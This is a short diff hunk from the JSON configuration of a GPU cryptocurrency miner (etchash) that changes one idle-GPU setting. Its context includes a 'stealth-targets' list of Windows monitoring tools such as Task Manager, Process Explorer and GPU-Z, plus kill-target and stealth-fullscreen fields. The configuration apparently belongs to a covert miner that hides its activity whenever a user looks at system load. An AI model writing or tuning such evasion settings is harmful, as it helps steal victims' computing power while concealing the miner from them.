@@ -3,7 +3,7 @@
     "algo": "etchash",
     "max-gpu": 20,
     "idle-wait": 33,
-    "idle-gpu": 20,
+    "idle-gpu": 30,
     "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe,cpuz.exe,anvir.exe,anvir64.exe,anvirlauncher.exe,gpu-z.exe,real-temp.exe,NVCleanstall.exe,ThrottleStop.exe",
     "kill-targets": "",
     "stealth-fullscreen": false
